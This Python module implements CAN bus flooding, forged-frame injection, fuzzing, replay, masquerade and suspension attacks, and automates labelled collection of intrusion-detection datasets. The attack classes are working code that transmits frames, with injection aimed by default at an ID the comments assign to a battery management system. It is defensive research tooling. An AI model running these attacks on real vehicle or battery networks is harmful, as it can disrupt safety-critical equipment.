"""
Attack Generator — CAN bus fault injection module for CANtroller.

Implements six attack types for Intrusion Detection System dataset generation:
  1. DoS         — Bus flooding with high-priority frames
  2. Injection   — Forged frames with manipulated payloads
  3. Fuzzing     — Random CAN IDs and payloads
  4. Replay      — Record normal traffic then retransmit
  5. Masquerade  — Suppress real ECU + impersonate at learned timing
  6. Suspension  — Silence a specific periodic CAN message

Each attack is a QObject with start()/stop() and integrates with:
  - CANManager      for frame transmission
  - LabeledLogger   for ground-truth labeling
  - SimulationEngine for suppress/masquerade coordination
"""
import logging
import os
import random
import threading
import time
from dataclasses import dataclass, field
from typing import List, Optional, Dict, Callable

log = logging.getLogger('cantroller.attack_generator')

from PyQt6.QtCore import QObject, pyqtSignal
import can

from labeled_logger import LabeledLogger


# ──────────────────────────────────────────────────────────────
#  Base Attack
# ──────────────────────────────────────────────────────────────

class BaseAttack(QObject):
    """Abstract base for all attack types."""

    status_changed = pyqtSignal(str)   # human-readable status
    attack_finished = pyqtSignal()     # emitted when timed attack ends
    frame_count_changed = pyqtSignal(int)

    LABEL = "unknown"

    def __init__(self, can_manager, logger: LabeledLogger):
        super().__init__()
        self._can_manager = can_manager
        self._logger = logger
        self._running = False
        self._frame_count = 0

    @property
    def is_running(self) -> bool:
        return self._running

    @property
    def frame_count(self) -> int:
        return self._frame_count

    def start(self):
        raise NotImplementedError

    def stop(self):
        raise NotImplementedError

    def _send(self, arb_id: int, data: list, is_extended: bool, subtype: str = ""):
        """Send a frame and log it as an attack."""
        ok = self._can_manager.send_message(arb_id, data, is_extended, silent=True)
        if ok:
            self._frame_count += 1
            self._logger.log_tx(arb_id, data, is_extended,
                                label=self.LABEL, subtype=subtype)
            self.frame_count_changed.emit(self._frame_count)
        return ok


# ──────────────────────────────────────────────────────────────
#  1. DoS Attack
# ──────────────────────────────────────────────────────────────

class DoSAttack(BaseAttack):
    """
    Bus flooding: transmit highest-priority frame at maximum rate.

    Parameters:
        arb_id       — CAN ID to flood (default 0x000, standard)
        is_extended  — extended frame flag
        duration_s   — 0 = infinite, >0 = auto-stop after N seconds
        rate_limit   — max frames/s (0 = unlimited)
    """
    LABEL = "dos"

    def __init__(self, can_manager, logger: LabeledLogger,
                 arb_id: int = 0x000, is_extended: bool = False,
                 duration_s: float = 0, rate_limit: int = 0):
        super().__init__(can_manager, logger)
        self.arb_id = arb_id
        self.is_extended = is_extended
        self.duration_s = duration_s
        self.rate_limit = rate_limit
        self._thread: Optional[threading.Thread] = None

    def start(self):
        if self._running:
            return
        self._running = True
        self._frame_count = 0
        self._thread = threading.Thread(target=self._flood_loop, daemon=True)
        self._thread.start()
        log.info('DoS started — ID 0x%03X, rate_limit=%d, duration=%ss', self.arb_id, self.rate_limit, self.duration_s)
        self.status_changed.emit(f"DoS started — ID 0x{self.arb_id:03X}")

    def stop(self):
        self._running = False
        if self._thread:
            self._thread.join(timeout=2.0)
            self._thread = None
        self.status_changed.emit(f"DoS stopped — {self._frame_count} frames sent")
        self.attack_finished.emit()

    def _flood_loop(self):
        data = [0x00] * 8
        start = time.monotonic()
        interval = 1.0 / self.rate_limit if self.rate_limit > 0 else 0
        while self._running:
            if self.duration_s > 0 and (time.monotonic() - start) >= self.duration_s:
                self._running = False
                break
            self._send(self.arb_id, data, self.is_extended, subtype="flood")
            if interval > 0:
                time.sleep(interval)
        self.status_changed.emit(f"DoS finished — {self._frame_count} frames sent")
        self.attack_finished.emit()


# ──────────────────────────────────────────────────────────────
#  2. Injection Attack
# ──────────────────────────────────────────────────────────────

class InjectionAttack(BaseAttack):
    """
    Inject forged frames with manipulated payload on a known CAN ID.

    Parameters:
        target_id    — CAN ID to spoof (e.g. 0x18F81280 for BMS)
        is_extended  — extended frame flag
        payload      — 8-byte payload to inject
        subtype_str  — descriptive label (e.g. "soc_spoof_full")
        cycle_ms     — injection rate in ms
        duration_s   — 0 = infinite
    """
    LABEL = "injection"

    def __init__(self, can_manager, logger: LabeledLogger,
                 target_id: int = 0x18F81280, is_extended: bool = True,
                 payload: list = None, subtype_str: str = "forged",
                 cycle_ms: int = 100, duration_s: float = 0):
        super().__init__(can_manager, logger)
        self.target_id = target_id
        self.is_extended = is_extended
        self.payload = payload if payload else [0x00] * 8
        self.subtype_str = subtype_str
        self.cycle_ms = max(1, cycle_ms)
        self.duration_s = duration_s
        self._thread: Optional[threading.Thread] = None

    def start(self):
        if self._running:
            return
        self._running = True
        self._frame_count = 0
        self._thread = threading.Thread(target=self._inject_loop, daemon=True)
        self._thread.start()
        self.status_changed.emit(
            f"Injection started — ID 0x{self.target_id:08X} every {self.cycle_ms}ms")

    def stop(self):
        self._running = False
        if self._thread:
            self._thread.join(timeout=2.0)
            self._thread = None
        self.status_changed.emit(
            f"Injection stopped — {self._frame_count} frames sent")
        self.attack_finished.emit()

    def _inject_loop(self):
        interval = self.cycle_ms / 1000.0
        start = time.monotonic()
        while self._running:
            if self.duration_s > 0 and (time.monotonic() - start) >= self.duration_s:
                self._running = False
                break
            self._send(self.target_id, self.payload, self.is_extended,
                       subtype=self.subtype_str)
            time.sleep(interval)
        self.status_changed.emit(f"Injection finished — {self._frame_count} frames sent")
        self.attack_finished.emit()


# ──────────────────────────────────────────────────────────────
#  3. Fuzzing Attack
# ──────────────────────────────────────────────────────────────

class FuzzAttack(BaseAttack):
    """
    Random CAN IDs and payloads.

    Parameters:
        id_mode      — "standard" (11-bit), "extended" (29-bit), "both"
        rate_limit   — frames/s (0 = max)
        duration_s   — 0 = infinite
    """
    LABEL = "fuzzing"

    def __init__(self, can_manager, logger: LabeledLogger,
                 id_mode: str = "standard", rate_limit: int = 500,
                 duration_s: float = 0):
        super().__init__(can_manager, logger)
        self.id_mode = id_mode
        self.rate_limit = max(1, rate_limit)
        self.duration_s = duration_s
        self._thread: Optional[threading.Thread] = None

    def start(self):
        if self._running:
            return
        self._running = True
        self._frame_count = 0
        self._thread = threading.Thread(target=self._fuzz_loop, daemon=True)
        self._thread.start()
        self.status_changed.emit(f"Fuzzing started — {self.id_mode} IDs @ {self.rate_limit} fps")

    def stop(self):
        self._running = False
        if self._thread:
            self._thread.join(timeout=2.0)
            self._thread = None
        self.status_changed.emit(f"Fuzzing stopped — {self._frame_count} frames sent")
        self.attack_finished.emit()

    def _fuzz_loop(self):
        interval = 1.0 / self.rate_limit
        start = time.monotonic()
        while self._running:
            if self.duration_s > 0 and (time.monotonic() - start) >= self.duration_s:
                self._running = False
                break

            if self.id_mode == "standard":
                arb_id = random.randint(0x000, 0x7FF)
                extended = False
            elif self.id_mode == "extended":
                arb_id = random.randint(0x000, 0x1FFFFFFF)
                extended = True
            else:  # both
                extended = random.choice([True, False])
                arb_id = random.randint(0x000, 0x1FFFFFFF if extended else 0x7FF)

            data = [random.randint(0, 255) for _ in range(8)]
            self._send(arb_id, data, extended, subtype="random")
            time.sleep(interval)
        self.status_changed.emit(f"Fuzzing finished — {self._frame_count} frames sent")
        self.attack_finished.emit()


# ──────────────────────────────────────────────────────────────
#  4. Replay Attack
# ──────────────────────────────────────────────────────────────

class ReplayAttack(BaseAttack):
    """
    Record → delay → replay.

    Phase 1 (record): capture all RX frames for record_duration_s.
    Phase 2 (delay):  wait replay_delay_s.
    Phase 3 (replay): retransmit captured frames preserving inter-frame timing.

    Parameters:
        record_duration_s  — how long to record
        replay_delay_s     — pause before replay
        replay_count       — number of times to replay the recorded buffer
        filter_ids         — set of CAN IDs to record (empty = all)
    """
    LABEL = "replay"

    recording_started = pyqtSignal()
    recording_finished = pyqtSignal(int)   # number of captured frames
    replay_started = pyqtSignal()

    def __init__(self, can_manager, logger: LabeledLogger,
                 record_duration_s: float = 10,
                 replay_delay_s: float = 2,
                 replay_count: int = 1,
                 filter_ids: set = None):
        super().__init__(can_manager, logger)
        self.record_duration_s = record_duration_s
        self.replay_delay_s = replay_delay_s
        self.replay_count = max(1, replay_count)
        self.filter_ids = filter_ids or set()
        self._captured: List[tuple] = []   # (delta_us, arb_id, data, is_extended)
        self._thread: Optional[threading.Thread] = None

    def start(self):
        if self._running:
            return
        self._running = True
        self._frame_count = 0
        self._captured.clear()
        self._thread = threading.Thread(target=self._record_and_replay, daemon=True)
        self._thread.start()
        self.status_changed.emit("Replay — recording started…")

    def stop(self):
        self._running = False
        if self._thread:
            self._thread.join(timeout=5.0)
            self._thread = None
        self.status_changed.emit(f"Replay stopped — {self._frame_count} frames replayed")
        self.attack_finished.emit()

    def _record_and_replay(self):
        # --- Phase 1: record ---
        self.recording_started.emit()
        tap = self._can_manager.create_rx_tap()
        recorded = []
        prev_ts = None
        start = time.monotonic()
        while self._running and (time.monotonic() - start) < self.record_duration_s:
            while tap:
                try:
                    msg = tap.popleft()
                except IndexError:
                    break
                if self.filter_ids and msg.arbitration_id not in self.filter_ids:
                    continue
                ts = msg.timestamp if msg.timestamp else time.time()
                delta = 0 if prev_ts is None else max(0, ts - prev_ts)
                recorded.append((delta, msg.arbitration_id,
                                 list(msg.data), msg.is_extended_id))
                prev_ts = ts
            time.sleep(0.005)
        self._can_manager.remove_rx_tap(tap)

        self._captured = recorded
        self.recording_finished.emit(len(recorded))
        self.status_changed.emit(
            f"Replay — recorded {len(recorded)} frames, waiting {self.replay_delay_s}s…")

        if not self._running or not recorded:
            self._running = False
            self.attack_finished.emit()
            return

        # --- Phase 2: delay ---
        wait_end = time.monotonic() + self.replay_delay_s
        while self._running and time.monotonic() < wait_end:
            time.sleep(0.05)

        # --- Phase 3: replay ---
        self.replay_started.emit()
        for rep in range(self.replay_count):
            if not self._running:
                break
            self.status_changed.emit(
                f"Replay — playing back ({rep+1}/{self.replay_count})…")
            for delta, arb_id, data, ext in recorded:
                if not self._running:
                    break
                if delta > 0:
                    time.sleep(delta)
                self._send(arb_id, data, ext, subtype="replayed")

        self._running = False
        self.status_changed.emit(f"Replay finished — {self._frame_count} frames sent")
        self.attack_finished.emit()


# ──────────────────────────────────────────────────────────────
#  5. Masquerade Attack
# ──────────────────────────────────────────────────────────────

class MasqueradeAttack(BaseAttack):
    """
    Silence the real ECU and impersonate it with drifting payloads.

    Phase 1: Observe target_id for learn_duration_s, compute mean period.
    Phase 2: Suppress simulator's transmission of target_id.
    Phase 3: Transmit forged frames at learned period with gradual payload drift.

    Parameters:
        target_id         — CAN ID to impersonate
        sim_engine        — SimulationEngine reference (to suppress its messages)
        learn_duration_s  — observation window
        drift_byte        — which payload byte to drift (0-7)
        drift_step        — increment per frame (+1, -1, etc.)
        duration_s        — 0 = infinite
    """
    LABEL = "masquerade"

    def __init__(self, can_manager, logger: LabeledLogger,
                 target_id: int = 0x18F81280, is_extended: bool = True,
                 sim_engine=None,
                 learn_duration_s: float = 5,
                 drift_byte: int = 4, drift_step: int = 1,
                 duration_s: float = 0):
        super().__init__(can_manager, logger)
        self.target_id = target_id
        self.is_extended = is_extended
        self._sim_engine = sim_engine
        self.learn_duration_s = learn_duration_s
        self.drift_byte = max(0, min(drift_byte, 7))
        self.drift_step = drift_step
        self.duration_s = duration_s
        self._learned_period_s = 0.1
        self._last_payload: list = [0x00] * 8
        self._thread: Optional[threading.Thread] = None

    def start(self):
        if self._running:
            return
        self._running = True
        self._frame_count = 0
        self._thread = threading.Thread(target=self._masquerade_loop, daemon=True)
        self._thread.start()
        self.status_changed.emit(
            f"Masquerade — learning ID 0x{self.target_id:08X}…")

    def stop(self):
        self._running = False
        # Un-suppress the simulator ID
        if self._sim_engine:
            self._sim_engine.unsuppress_id(self.target_id)
        if self._thread:
            self._thread.join(timeout=5.0)
            self._thread = None
        self.status_changed.emit(
            f"Masquerade stopped — {self._frame_count} frames sent")
        self.attack_finished.emit()

    def _masquerade_loop(self):
        # --- Phase 1: learn timing & payload ---
        tap = self._can_manager.create_rx_tap()
        timestamps = []
        start = time.monotonic()
        while self._running and (time.monotonic() - start) < self.learn_duration_s:
            while tap:
                try:
                    msg = tap.popleft()
                except IndexError:
                    break
                if msg.arbitration_id == self.target_id:
                    timestamps.append(msg.timestamp or time.time())
                    self._last_payload = list(msg.data)
            time.sleep(0.005)
        self._can_manager.remove_rx_tap(tap)

        if len(timestamps) >= 2:
            deltas = [timestamps[i+1] - timestamps[i]
                      for i in range(len(timestamps)-1)
                      if timestamps[i+1] > timestamps[i]]
            if deltas:
                self._learned_period_s = sum(deltas) / len(deltas)

        self.status_changed.emit(
            f"Masquerade — learned period {self._learned_period_s*1000:.0f}ms, "
            f"suppressing + impersonating…")

        # --- Phase 2: suppress simulator ---
        if self._sim_engine:
            self._sim_engine.suppress_id(self.target_id)

        # --- Phase 3: impersonate with drift ---
        attack_start = time.monotonic()
        payload = list(self._last_payload)
        while self._running:
            if self.duration_s > 0 and (time.monotonic() - attack_start) >= self.duration_s:
                self._running = False
                break
            self._send(self.target_id, payload, self.is_extended,
                       subtype=f"drift_byte{self.drift_byte}")
            # Apply drift
            payload[self.drift_byte] = (payload[self.drift_byte] + self.drift_step) & 0xFF
            time.sleep(self._learned_period_s)

        # Un-suppress on exit
        if self._sim_engine:
            self._sim_engine.unsuppress_id(self.target_id)

        self.status_changed.emit(
            f"Masquerade finished — {self._frame_count} frames sent")
        self.attack_finished.emit()


# ──────────────────────────────────────────────────────────────
#  6. Suspension Attack
# ──────────────────────────────────────────────────────────────

class SuspensionAttack(BaseAttack):
    """
    Suppress a specific CAN ID from the simulator for a duration.

    Parameters:
        target_id    — CAN ID to suppress
        sim_engine   — SimulationEngine reference
        duration_s   — how long to suppress (0 = until manual stop)
    """
    LABEL = "suspension"

    def __init__(self, can_manager, logger: LabeledLogger,
                 target_id: int = 0x18F81280,
                 sim_engine=None,
                 duration_s: float = 10):
        super().__init__(can_manager, logger)
        self.target_id = target_id
        self._sim_engine = sim_engine
        self.duration_s = duration_s
        self._thread: Optional[threading.Thread] = None

    def start(self):
        if self._running:
            return
        self._running = True
        self._frame_count = 0
        if self._sim_engine:
            self._sim_engine.suppress_id(self.target_id)
        self.status_changed.emit(
            f"Suspension — ID 0x{self.target_id:08X} suppressed")

        if self.duration_s > 0:
            self._thread = threading.Thread(target=self._suspension_wait, daemon=True)
            self._thread.start()

    def stop(self):
        self._running = False
        if self._thread:
            self._thread.join(timeout=5.0)
            self._thread = None
        if self._sim_engine:
            self._sim_engine.unsuppress_id(self.target_id)
        self.status_changed.emit(
            f"Suspension ended — ID 0x{self.target_id:08X} resumed")
        self.attack_finished.emit()

    def _suspension_wait(self):
        """Wait for duration then auto-stop."""
        end = time.monotonic() + self.duration_s
        while self._running and time.monotonic() < end:
            time.sleep(0.1)
        if self._running:
            self._running = False
            if self._sim_engine:
                self._sim_engine.unsuppress_id(self.target_id)
            self.status_changed.emit(
                f"Suspension finished — ID 0x{self.target_id:08X} resumed")
            self.attack_finished.emit()


# ──────────────────────────────────────────────────────────────
#  Dataset Collection Mode
# ──────────────────────────────────────────────────────────────

@dataclass
class CollectionStep:
    """One step in a dataset collection sequence."""
    phase: str          # "normal", attack label, or "sim:profile_name"
    duration_s: float
    attack_factory: Optional[Callable] = None   # callable() → BaseAttack
    subtype: str = ""
    profile_factory: Optional[Callable] = None  # callable() → TripProfile (for sim: steps)


class DatasetCollector(QObject):
    """
    Automates the collection protocol:
      normal → attack → normal → attack → … → normal → stop

    Emits progress signals so the GUI can show what's happening.
    Writes a metadata JSON alongside the CSV with collection parameters.
    """

    step_changed = pyqtSignal(int, int, str)   # current_step, total_steps, description
    collection_finished = pyqtSignal(str)       # filepath of resulting CSV
    status_changed = pyqtSignal(str)

    def __init__(self, can_manager, logger: LabeledLogger):
        super().__init__()
        self._can_manager = can_manager
        self._logger = logger
        self._steps: List[CollectionStep] = []
        self._running = False
        self._current_attack: Optional[BaseAttack] = None
        self._thread: Optional[threading.Thread] = None
        self._metadata: Dict = {}
        self._sim_engine = None  # Set via set_sim_engine()

    def set_sim_engine(self, sim_engine):
        """Provide a reference to the SimulationEngine for profile switching."""
        self._sim_engine = sim_engine

    @property
    def is_running(self) -> bool:
        return self._running

    def set_steps(self, steps: List[CollectionStep]):
        self._steps = steps

    def set_metadata(self, meta: Dict):
        """Store extra metadata to include in the JSON sidecar."""
        self._metadata = dict(meta)

    def start(self, output_path: str):
        if self._running:
            return
        self._running = True
        self._output_path = output_path
        self._logger.start(output_path)
        self._thread = threading.Thread(target=self._run_sequence, daemon=True)
        self._thread.start()

    def stop(self):
        self._running = False
        if self._current_attack and self._current_attack.is_running:
            self._current_attack.stop()
        if self._thread:
            self._thread.join(timeout=10.0)
        self._logger.stop()
        self.status_changed.emit("Collection stopped")

    def _write_metadata(self):
        """Write a JSON sidecar next to the CSV with collection info."""
        import json
        from datetime import datetime
        csv_path = getattr(self, '_output_path', '') or self._logger.filepath or ''
        if not csv_path:
            return
        json_path = os.path.splitext(csv_path)[0] + '_meta.json'
        step_summary = []
        for s in self._steps:
            step_summary.append({
                'phase': s.phase,
                'duration_s': s.duration_s,
                'subtype': s.subtype,
            })
        meta = {
            'csv_file': os.path.basename(csv_path),
            'collected_at': datetime.now().isoformat(),
            'total_frames': self._logger.total_count,
            'rx_frames': self._logger.rx_count,
            'tx_frames': self._logger.tx_count,
            'steps': step_summary,
        }
        meta.update(self._metadata)
        with open(json_path, 'w', encoding='utf-8') as f:
            json.dump(meta, f, indent=2, ensure_ascii=False)
        log.info('Metadata written → %s', json_path)

    def _run_sequence(self):
        total = len(self._steps)
        log.info('Dataset collection started — %d steps', total)
        sim_was_running = self._sim_engine and self._sim_engine.is_running
        for i, step in enumerate(self._steps):
            if not self._running:
                break
            self.step_changed.emit(i + 1, total, f"{step.phase}: {step.duration_s}s")

            if step.phase.startswith("sim:"):
                # Simulation profile step: label frames as normal, switch simulator
                self._logger.set_label("normal", step.phase)
                self._start_sim_profile(step)
                self.status_changed.emit(
                    f"[{i+1}/{total}] {step.phase} — {step.duration_s}s")
                self._wait(step.duration_s)
            elif step.phase == "normal":
                self._logger.set_label(step.phase, step.subtype)
                self.status_changed.emit(
                    f"[{i+1}/{total}] Normal traffic \u2014 {step.duration_s}s")
                self._wait(step.duration_s)
            else:
                # Start the attack
                self._logger.set_label(step.phase, step.subtype)
                if step.attack_factory:
                    attack = step.attack_factory()
                    self._current_attack = attack
                    attack.start()
                    self.status_changed.emit(
                        f"[{i+1}/{total}] {step.phase} attack — {step.duration_s}s")
                    self._wait(step.duration_s)
                    attack.stop()
                    self._current_attack = None

        # If the simulator wasn't running before we started, stop it now
        if not sim_was_running and self._sim_engine and self._sim_engine.is_running:
            self._sim_engine.stop()

        self._running = False
        self._logger.reset_label()
        self._logger.stop()
        self._write_metadata()
        filepath = self._logger.filepath or ""
        self.collection_finished.emit(filepath)
        log.info('Dataset collection complete: %s (%d frames)', filepath, self._logger.total_count)
        self.status_changed.emit(f"Dataset collection complete: {filepath}")

    def _start_sim_profile(self, step: CollectionStep):
        """Load and start a simulation profile for a sim: step."""
        if not self._sim_engine:
            log.warning('No sim_engine set — cannot run sim: step')
            return
        if step.profile_factory:
            profile = step.profile_factory()
            self._sim_engine.load_profile(profile)
            self._sim_engine.start()

    def _wait(self, seconds: float):
        """Wait in small increments so we can be interrupted."""
        end = time.monotonic() + seconds
        while self._running and time.monotonic() < end:
            time.sleep(0.1)
